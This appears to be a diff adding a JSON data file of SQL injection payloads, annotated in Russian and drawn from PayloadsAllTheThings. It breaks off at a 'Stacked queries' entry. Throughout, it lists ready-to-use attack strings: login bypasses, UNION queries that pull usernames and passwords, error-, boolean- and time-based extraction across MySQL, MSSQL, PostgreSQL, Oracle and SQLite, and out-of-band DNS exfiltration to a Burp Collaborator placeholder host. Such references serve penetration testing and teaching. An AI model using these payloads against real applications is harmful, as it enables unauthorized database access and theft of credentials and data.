@@ -1,0 +1,1145 @@
+{
+  "category": "SQL Injection",
+  "source": "PayloadsAllTheThings/SQL Injection/",
+  "entries": [
+    {
+      "subcategory": "Детект и методология",
+      "title": "Поиск точки входа — спецсимволы",
+      "language": "text",
+      "tags": ["detection", "entry-point", "methodology"],
+      "body": "Вставляем спецсимволы в параметры и смотрим на SQL-ошибки в ответе.\n\nПростые символы:        '  \"  ;  )  *\nURL-encoded:            %27  %22  %23  %3B  %29  %2A\nДвойное кодирование:    %%2727  %25%27\nUnicode (нормализация в кавычку):\n  U+02BA (MODIFIER LETTER DOUBLE PRIME, %CA%BA) → U+0022  \"\n  U+02B9 (MODIFIER LETTER PRIME,        %CA%B9) → U+0027  '"
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Подтверждение инъекции — логика (tautology)",
+      "language": "sql",
+      "tags": ["detection", "boolean-based", "entry-point"],
+      "body": "page.asp?id=1 or 1=1 -- true\npage.asp?id=1' or 1=1 -- true\npage.asp?id=1\" or 1=1 -- true\npage.asp?id=1 and 1=2 -- false"
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Склейка строк (merging characters)",
+      "language": "sql",
+      "tags": ["detection", "entry-point"],
+      "body": "`+HERP\n'||'DERP\n'+'herp\n' 'DERP\n'%20'HERP\n'%2B'HERP"
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Определение СУБД по ключевым словам",
+      "language": "table",
+      "tags": ["detection", "fingerprint", "dbms"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["СУБД", "Payload (всегда true в этой СУБД)"],
+          "rows": [
+            ["MySQL", "conv('a',16,2)=conv('a',16,2)"],
+            ["MySQL", "connection_id()=connection_id()"],
+            ["MySQL", "crc32('MySQL')=crc32('MySQL')"],
+            ["MSSQL", "BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"],
+            ["MSSQL", "@@CONNECTIONS>0"],
+            ["MSSQL", "@@CPU_BUSY=@@CPU_BUSY"],
+            ["MSSQL", "USER_ID(1)=USER_ID(1)"],
+            ["ORACLE", "ROWNUM=ROWNUM"],
+            ["ORACLE", "RAWTOHEX('AB')=RAWTOHEX('AB')"],
+            ["ORACLE", "LNNVL(0=123)"],
+            ["POSTGRESQL", "5::int=5"],
+            ["POSTGRESQL", "pg_client_encoding()=pg_client_encoding()"],
+            ["POSTGRESQL", "current_database()=current_database()"],
+            ["SQLITE", "sqlite_version()=sqlite_version()"],
+            ["SQLITE", "last_insert_rowid()>1"],
+            ["MSACCESS", "val(cvar(1))=1"],
+            ["MSACCESS", "IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Определение СУБД по тексту ошибки",
+      "language": "table",
+      "tags": ["detection", "fingerprint", "error-based"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["СУБД", "Пример текста ошибки", "Payload"],
+          "rows": [
+            ["MySQL", "You have an error in your SQL syntax; ... near '' at line 1", "'"],
+            ["PostgreSQL", "ERROR: unterminated quoted string at or near \"'\"", "'"],
+            ["PostgreSQL", "ERROR: syntax error at or near \"1\"", "1'"],
+            ["MSSQL", "Unclosed quotation mark after the character string ''.", "'"],
+            ["MSSQL", "The conversion of the varchar value to data type int resulted in an out-of-range value.", "1'"],
+            ["Oracle", "ORA-00933: SQL command not properly ended", "'"],
+            ["Oracle", "ORA-01756: quoted string not properly terminated", "'"],
+            ["Oracle", "ORA-00923: FROM keyword not found where expected", "1'"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Схема построения payload из Unicode-символов",
+      "language": "image",
+      "tags": ["detection", "unicode", "waf-bypass"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/sql-injection/Unicode_SQL_injection.png",
+        "caption": "Таблица соответствия Unicode-символов их URL-кодировке и сборка payload ' and 1=1-- из них (обход фильтров на кавычки). Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Методология blind-инъекции (boolean / time)",
+      "language": "text",
+      "tags": ["methodology", "blind", "boolean-based"],
+      "body": "Blind SQLi — задаём БД вопросы «да/нет» и судим по реакции приложения.\nИндикаторы успеха boolean-based: размер страницы, HTTP-код, пропавшие части страницы.\n\n1. Подтвердить уязвимость:\n   id=1 AND 1=1 --   (нормальный ответ)\n   id=1 AND 1=2 --   (другой ответ / ошибка)\n\n2. Узнать длину значения (наращиваем N):\n   id=1 AND LENGTH(@@hostname)=N --\n\n3. Посимвольно вытащить значение:\n   id=1 AND ASCII(SUBSTRING(@@hostname,1,1)) > 64 --\n   id=1 AND ASCII(SUBSTRING(@@hostname,1,1)) = 104 --\n\nСимволы перебирать дихотомией (бинарный поиск): запросов из линейного → логарифмический."
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Out-of-Band (OAST) — DNS-эксфильтрация",
+      "language": "sql",
+      "tags": ["oob", "oast", "exfiltration"],
+      "body": "-- MySQL\nLOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')\nSELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\n\n-- MSSQL\nSELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')\nexec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'"
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Routed Injection (вложенная инъекция через hex)",
+      "language": "sql",
+      "tags": ["routed", "advanced"],
+      "body": "Результат первого запроса используется для построения второго. Формат: ' union select 0xHEX -- где HEX — инъекция для второго запроса.\n\n-- 0x2720756e696f6e2073656c65637420312c3223 = ' union select 1,2#\n' union select 0x2720756e696f6e2073656c65637420312c3223#\n\n-- ' union select login,password from users-- a (hex)\n-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a"
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Second Order SQL Injection",
+      "language": "text",
+      "tags": ["second-order", "methodology"],
+      "body": "Payload сохраняется в БД и срабатывает позже, в другой функции приложения.\n\n1. Регистрация/профиль — вводим payload, он сохраняется:\n   Username: attacker'--\n2. Сохраняется без валидации (сама запись инъекцию не вызывает):\n   INSERT INTO users (username, email) VALUES ('attacker\\'--', 'attacker@example.com');\n3. Позже приложение читает данные и подставляет в новый запрос:\n   query = \"SELECT * FROM logs WHERE username = '\" + user_from_db + \"'\"\n4. Если этот запрос собран небезопасно — инъекция срабатывает."
+    },
+    {
+      "subcategory": "Детект и методология",
+      "title": "Polyglot — один payload для разных контекстов",
+      "language": "sql",
+      "tags": ["polyglot", "detection"],
+      "body": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"
+    },
+    {
+      "subcategory": "Auth Bypass",
+      "title": "Базовый обход аутентификации",
+      "language": "sql",
+      "tags": ["auth-bypass", "login"],
+      "body": "' OR '1'='1'--\n' or 1=1 limit 1 --"
+    },
+    {
+      "subcategory": "Auth Bypass",
+      "title": "Как работает обход — итоговый запрос",
+      "language": "text",
+      "tags": ["auth-bypass", "login", "methodology"],
+      "body": "Исходный запрос:\n  SELECT * FROM users WHERE username = 'user' AND password = 'pass';\n\nВ поле username вставляем  ' OR '1'='1'--  → запрос становится:\n  SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';\n\n'1'='1' всегда истинно, остаток закомментирован — пароль не проверяется.\n\nВНИМАНИЕ: без LIMIT вернётся массив всех юзеров → ошибка на сервере, ожидающем одну строку. Добавь LIMIT 1.\nВНИМАНИЕ: ' or 1=1 -- всегда true и может задеть delete/destroy-эндпоинты — применяй осторожно."
+    },
+    {
+      "subcategory": "Auth Bypass",
+      "title": "Тестовые строки для формы логина (MySQL)",
+      "language": "sql",
+      "tags": ["auth-bypass", "login", "mysql"],
+      "body": "' OR '1\n' OR 1 -- -\n\" OR \"\" = \"\n\" OR 1 = 1 -- -\n'='\n'LIKE'\n'=0--+"
+    },
+    {
+      "subcategory": "Auth Bypass",
+      "title": "Список payload'ов для перебора (Intruder)",
+      "language": "text",
+      "tags": ["auth-bypass", "login", "fuzzing"],
+      "body": "or true--\n\" or true--\n' or true--\n\") or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n\" or \"x\"=\"x\n\") or (\"x\")=(\"x\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' #\nadmin'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin') or ('1'='1\nadmin') or '1'='1\nadmin\" or \"1\"=\"1\nadmin\" or \"1\"=\"1\"--\nadmin\"or 1=1 or \"\"=\"\nadmin\" or 1=1--"
+    },
+    {
+      "subcategory": "Auth Bypass",
+      "title": "Raw MD5/SHA1 — обход в незакавыченном хеше",
+      "language": "text",
+      "tags": ["auth-bypass", "php", "md5"],
+      "body": "Если PHP-код сравнивает raw-бинарный хеш:\n  sql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";\n\nПодбираем вход, чей raw-хеш содержит кавычку и ' or '...:"
+    },
+    {
+      "subcategory": "Auth Bypass",
+      "title": "Raw MD5/SHA1 — известные строки",
+      "language": "table",
+      "tags": ["auth-bypass", "php", "md5", "sha1"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Хеш", "Вход", "Кусок в payload"],
+          "rows": [
+            ["md5", "ffifdyop", "'or'"],
+            ["md5", "129581926211651571912466741651878684928", "'or'"],
+            ["sha1", "3fDf", "'='"],
+            ["sha1", "178374", "'/*"],
+            ["sha1", "17", "\\"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Auth Bypass",
+      "title": "Хешированные пароли — подстановка хеша через UNION",
+      "language": "sql",
+      "tags": ["auth-bypass", "union", "hash"],
+      "body": "admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--"
+    },
+    {
+      "subcategory": "Auth Bypass",
+      "title": "Подстановка хеша — пояснение",
+      "language": "text",
+      "tags": ["auth-bypass", "union", "hash", "methodology"],
+      "body": "Если приложение само считает hash(введённый_пароль) и сравнивает с хешем из БД, можно подсунуть строку через UNION:\n\n  AND 1=0           — обнуляем оригинальный результат\n  SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'  — нужное число колонок; хеш = MD5(\"P@ssw0rd\")\n\nТогда логинимся как admin с паролем P@ssw0rd.\nНе сработает, если хранится salt + KDF(salt, password): один статичный хеш не совпадёт с посоленным результатом."
+    },
+    {
+      "subcategory": "UNION-based",
+      "title": "Принцип UNION-инъекции",
+      "language": "sql",
+      "tags": ["union", "methodology"],
+      "body": "-- Исходный запрос:\nSELECT product_name, product_price FROM products WHERE product_id = 'input_id';\n\n-- Инъекция:\n1' UNION SELECT username, password FROM users --\n\n-- Результат:\nSELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';\n\n-- ВНИМАНИЕ: число колонок в обоих SELECT должно совпадать."
+    },
+    {
+      "subcategory": "UNION-based",
+      "title": "Определение числа колонок — ORDER BY",
+      "language": "sql",
+      "tags": ["union", "columns", "order-by"],
+      "body": "ORDER BY 1--+   (или GROUP BY 1--+)\nORDER BY 2--+\nORDER BY 3--+\nORDER BY 4--+   -- False → колонок 3\n\n-- одним запросом (если ошибки видны):\nORDER BY 1,2,3,4,5,6,7,8,9,10,...,100--+   -- # Unknown column '4' in 'order clause'"
+    },
+    {
+      "subcategory": "UNION-based",
+      "title": "Определение числа колонок — NULL",
+      "language": "sql",
+      "tags": ["union", "columns", "null"],
+      "body": "UNION SELECT NULL;--\nUNION SELECT NULL, NULL;-- \nUNION SELECT NULL, NULL, NULL;-- "
+    },
+    {
+      "subcategory": "UNION-based",
+      "title": "Извлечение структуры через information_schema (MySQL)",
+      "language": "sql",
+      "tags": ["union", "mysql", "information_schema", "enumeration"],
+      "body": "-- БД (schemata)\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata\n\n-- Таблицы\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER\n\n-- Колонки\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...\n\n-- Данные\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ..."
+    },
+    {
+      "subcategory": "UNION-based",
+      "title": "Извлечение имён колонок без information_schema (MySQL)",
+      "language": "sql",
+      "tags": ["union", "mysql", "error-based"],
+      "body": "-- MySQL >= 4.1 (по тексту ошибки)\n(1)and(SELECT * from db.users)=(1)                                          -- Operand should contain 4 column(s)\n1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)      -- Column 'id' cannot be null\n\n-- MySQL 5 (JOIN ... USING)\nUNION SELECT * FROM (SELECT * FROM users JOIN users b)a                      -- Duplicate column name 'id'\nUNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a            -- Duplicate column name 'name'\nUNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a       -- Data"
+    },
+    {
+      "subcategory": "UNION-based",
+      "title": "Извлечение данных без имён колонок (MySQL)",
+      "language": "sql",
+      "tags": ["union", "mysql", "advanced"],
+      "body": "SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;\n\n-- Пример внутри select author_id,title from posts where author_id=[INJECT]\n-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "Принцип error-based (PostgreSQL пример)",
+      "language": "sql",
+      "tags": ["error-based", "postgresql", "methodology"],
+      "body": "-- LIMIT ждёт число, CAST version() в numeric выдаёт ошибку с выводом:\nLIMIT CAST((SELECT version()) as numeric)\n\n-- ERROR: invalid input syntax for type numeric: \"PostgreSQL 9.5.25 on x86_64-pc-linux-gnu\""
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "MySQL error-based — функции-триггеры",
+      "language": "table",
+      "tags": ["error-based", "mysql"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Функция", "Payload"],
+          "rows": [
+            ["GTID_SUBSET", "AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -"],
+            ["JSON_KEYS", "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -"],
+            ["EXTRACTVALUE", "AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -"],
+            ["UPDATEXML", "AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -"],
+            ["EXP", "AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -"],
+            ["OR", "OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -"],
+            ["NAME_CONST", "AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--"],
+            ["UUID_TO_BIN", "AND UUID_TO_BIN(version())='1"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "MySQL error-based — UpdateXML (читаемый)",
+      "language": "sql",
+      "tags": ["error-based", "mysql", "updatexml"],
+      "body": "UPDATEXML(null,CONCAT(0x0a,version()),null)-- -\nUPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "MySQL error-based — ExtractValue (полный обход)",
+      "language": "sql",
+      "tags": ["error-based", "mysql", "extractvalue", "enumeration"],
+      "body": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "MySQL error-based — Basic (double query)",
+      "language": "sql",
+      "tags": ["error-based", "mysql"],
+      "body": "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))\n'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "MSSQL error-based — функции-триггеры",
+      "language": "table",
+      "tags": ["error-based", "mssql"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Функция", "Payload"],
+          "rows": [
+            ["CONVERT", "AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -"],
+            ["IN", "AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -"],
+            ["EQUAL", "AND 1337=CONCAT('~',(SELECT @@version),'~') -- -"],
+            ["CAST", "CAST((SELECT @@version) AS INT)"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "MSSQL error-based — числовой и строковый ввод",
+      "language": "sql",
+      "tags": ["error-based", "mssql"],
+      "body": "-- числовой ввод\nconvert(int,@@version)\ncast((SELECT @@version) as int)\n\n-- строковый ввод\n' + convert(int,@@version) + '\n' + cast((SELECT @@version) as int) + '"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "PostgreSQL error-based — CAST",
+      "language": "sql",
+      "tags": ["error-based", "postgresql", "cast"],
+      "body": "AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -\nAND CAST((SELECT version()) AS INT)=1337 -- -\nAND (SELECT version())::int=1 -- -\n\n-- enumeration\nCAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "PostgreSQL — query_to_xml (дамп без LIMIT)",
+      "language": "sql",
+      "tags": ["error-based", "postgresql", "xml", "exfiltration"],
+      "body": "SELECT query_to_xml('select * from pg_user',true,true,''); -- все результаты одной XML-строкой\nSELECT database_to_xml(true,true,'');                       -- дамп текущей БД в XML\nSELECT database_to_xmlschema(true,true,'');"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "Oracle error-based — функции-триггеры",
+      "language": "table",
+      "tags": ["error-based", "oracle"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Описание", "Query"],
+          "rows": [
+            ["Invalid HTTP Request", "SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual"],
+            ["CTXSYS.DRITHSX.SN", "SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual"],
+            ["Invalid XPath", "SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual"],
+            ["XMLType", "AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(SELECT banner FROM v$version)||'~'||CHR(62))) FROM DUAL) -- -"],
+            ["DBMS_UTILITY", "AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~') -- -"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "MySQL — substring-эквиваленты",
+      "language": "table",
+      "tags": ["blind", "mysql", "substring"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Функция", "Пример"],
+          "rows": [
+            ["SUBSTR", "SUBSTR(version(),1,1)=5"],
+            ["SUBSTRING", "SUBSTRING(version(),1,1)=5"],
+            ["RIGHT", "RIGHT(left(version(),1),1)=5"],
+            ["MID", "MID(version(),1,1)=4"],
+            ["LEFT", "LEFT(version(),1)=4"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "MySQL blind — SUBSTRING / ASCII",
+      "language": "sql",
+      "tags": ["blind", "mysql", "boolean-based"],
+      "body": "?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'\n?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'\n?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51"
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "MySQL blind — LIKE (wildcard)",
+      "language": "sql",
+      "tags": ["blind", "mysql", "like"],
+      "body": "-- % — любое число символов, _ — ровно один символ\nSELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';\nSELECT * FROM products WHERE product_name LIKE '%user_input%'"
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "MySQL blind — символ _ (wildcard, DVWA)",
+      "language": "image",
+      "tags": ["blind", "mysql", "like"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/sql-injection/wildcard_underscore.jpg",
+        "caption": "Использование _ в LIKE для посимвольного подбора: 'p____' и пустой пароль возвращают конкретного пользователя; пустые маски возвращают всех. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "MySQL blind — REGEXP",
+      "language": "table",
+      "tags": ["blind", "mysql", "regexp"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Payload", "Описание"],
+          "rows": [
+            ["' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --", "Проверка длины"],
+            ["' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --", "Наличие цифр"],
+            ["' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --", "Данные, начинающиеся с \"a\""]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "Blind Error-based — ошибка как оракул (SQLite)",
+      "language": "sql",
+      "tags": ["blind", "error-based", "sqlite"],
+      "body": "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK\n' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON"
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "MSSQL blind — substring",
+      "language": "sql",
+      "tags": ["blind", "mssql"],
+      "body": "AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -\nAND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97\nAND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- \nAND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90"
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "PostgreSQL blind — substr",
+      "language": "sql",
+      "tags": ["blind", "postgresql"],
+      "body": "' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE\n' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE"
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "Oracle blind — проверки",
+      "language": "sql",
+      "tags": ["blind", "oracle"],
+      "body": "SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';\nSELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);\nSELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';\nSELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';"
+    },
+    {
+      "subcategory": "Blind / Boolean-based",
+      "title": "SQLite blind — методология",
+      "language": "table",
+      "tags": ["blind", "sqlite", "enumeration"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Описание", "SQL"],
+          "rows": [
+            ["Число таблиц", "AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table"],
+            ["Длина имени таблицы", "AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number"],
+            ["Извлечение (hex)", "AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Time-based",
+      "title": "Базовые SLEEP/WAITFOR по СУБД",
+      "language": "sql",
+      "tags": ["time-based", "blind"],
+      "body": "-- общий шаблон\n' AND SLEEP(5)/*\n' AND '1'='1' AND SLEEP(5)\n' ; WAITFOR DELAY '00:00:05' --\n\n-- тяжёлый запрос (crypto)\nBENCHMARK(2000000,MD5(NOW()))"
+    },
+    {
+      "subcategory": "Time-based",
+      "title": "MySQL time-based — функции задержки",
+      "language": "sql",
+      "tags": ["time-based", "mysql", "blind"],
+      "body": "-- BENCHMARK (MySQL 4/5)\n+BENCHMARK(40000000,SHA1(1337))+\n'+BENCHMARK(3200,SHA1(1))+'\n\n-- SLEEP (MySQL 5)\nRLIKE SLEEP([SLEEPTIME])\nOR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))\nXOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR\nAND SLEEP(10)=0\nAND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)"
+    },
+    {
+      "subcategory": "Time-based",
+      "title": "MySQL time-based — условный вывод",
+      "language": "sql",
+      "tags": ["time-based", "mysql", "blind"],
+      "body": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --\n?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --\n?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2"
+    },
+    {
+      "subcategory": "Time-based",
+      "title": "MySQL time-based — SLEEP в подзапросе (LIKE-перебор)",
+      "language": "sql",
+      "tags": ["time-based", "mysql", "blind"],
+      "body": "-- длина значения\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#\n\n-- посимвольно\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#"
+    },
+    {
+      "subcategory": "Time-based",
+      "title": "MSSQL time-based — WAITFOR DELAY",
+      "language": "sql",
+      "tags": ["time-based", "mssql", "blind"],
+      "body": "ProductID=1;waitfor delay '0:0:10'--\nProductID=1';waitfor delay '0:0:10'--\nProductID=1');waitfor delay '0:0:10'--\n\nIF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'\nIF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';"
+    },
+    {
+      "subcategory": "Time-based",
+      "title": "PostgreSQL time-based — pg_sleep",
+      "language": "sql",
+      "tags": ["time-based", "postgresql", "blind"],
+      "body": "-- детект\nselect 1 from pg_sleep(5)\n;(select 1 from pg_sleep(5))\n||(select 1 from pg_sleep(5))\n\n-- дамп\nselect case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1\nselect case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1\n\nAND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'"
+    },
+    {
+      "subcategory": "Time-based",
+      "title": "Oracle time-based — DBMS_PIPE",
+      "language": "sql",
+      "tags": ["time-based", "oracle", "blind"],
+      "body": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) \nAND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)"
+    },
+    {
+      "subcategory": "Time-based",
+      "title": "SQLite time-based — RANDOMBLOB",
+      "language": "sql",
+      "tags": ["time-based", "sqlite", "blind"],
+      "body": "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\nAND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
+    },
+    {
+      "subcategory": "Stacked queries",
+      "title": "Stacked queries — принцип",
